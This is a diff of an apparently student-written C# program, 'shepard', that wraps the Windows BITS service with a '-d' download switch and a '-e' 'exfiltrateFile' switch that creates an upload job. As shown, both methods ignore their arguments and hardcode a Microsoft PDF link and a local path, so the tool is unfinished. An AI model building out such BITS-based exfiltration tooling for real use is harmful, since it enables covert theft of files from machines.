@@ -1,32 +1,64 @@
-﻿
-using System;
+﻿using System;
+using System.Net.Cache;
+using System.Net.Configuration;
 using System.Threading.Tasks;
 using BITS = BITSReference1_5;
 
 namespace shepard
 {
-    class Program
+    class JobObj
     {
-        
-        private void setup()
+        static BITS.BackgroundCopyManager1_5 mgr;
+        static BITS.GUID jobGuid;
+        static BITS.IBackgroundCopyJob job;
+
+        public JobObj()
         {
-            Console.WriteLine("test message");
+            mgr = new BITS.BackgroundCopyManager1_5();
         }
 
         public static void Main(string[] args)
         {
             if (args.Length == 0) { return; }
 
-            var mgr = new BITS.BackgroundCopyManager1_5();
-            BITS.GUID jobGuid;
-            BITS.IBackgroundCopyJob job;
-            mgr.CreateJob("Quick download", BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
-            job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\enzod\Desktop\Server2016.pdf");
-            //
+            JobObj jo = new JobObj();
+
+            if (args.Length == 3)
+            {
+                if (args[0] == "-d")
+                {
+                    jo.downloadFile(args[1], args[2]);
+                    Console.WriteLine(args[1] + "string " + args[2]);
+                    return;
+                }
+                else if (args[0] == "-e")
+                {
+                    jo.exfiltrateFile(args[1], args[2]);
+                }
+            }else { return; }
+
+            jo.executeJob();
             //string inputaddr = "23.52.161.19";
             //System.Net.IPHostEntry hostEntry = System.Net.Dns.GetHostEntry(inputaddr);
             // System.Console.WriteLine(hostEntry.HostName);
             //job.AddFile(hostEntry.HostName, @"C:\Users\enzod\Desktop\Server2016.pdf");
+        }
+
+        private void downloadFile(string remoteLoc, string writeLoc)
+        {
+            mgr.CreateJob("QD", BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
+            job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
+        }
+
+        private void exfiltrateFile(string remoteLoc, string writeLoc)
+        {
+            mgr.CreateJob("QU", BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
+            job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
+        }
+        //somewhere in main, consisent loop for input of command
+
+        private void executeJob()
+        {
             job.Resume();
             bool jobIsFinal = false;
             while (!jobIsFinal)
@@ -49,24 +81,6 @@ namespace shepard
                         break;
                 }
             }
-            Console.ReadLine(); //pause execution of cmd window, enter to close
-            // Job is complete
         }
-
-        private void downloadFile()
-        {
-            Console.WriteLine("test message");
-        }
-
-        private void exfiltrateFile()
-        {
-            Console.WriteLine("test message");
-        }
-        //exfiltrate method
-        //download method
-        //init setup method called at the start of main
-        //somewhere in main, consisent loop for input of command
-
     }
 }
-// Job is complete
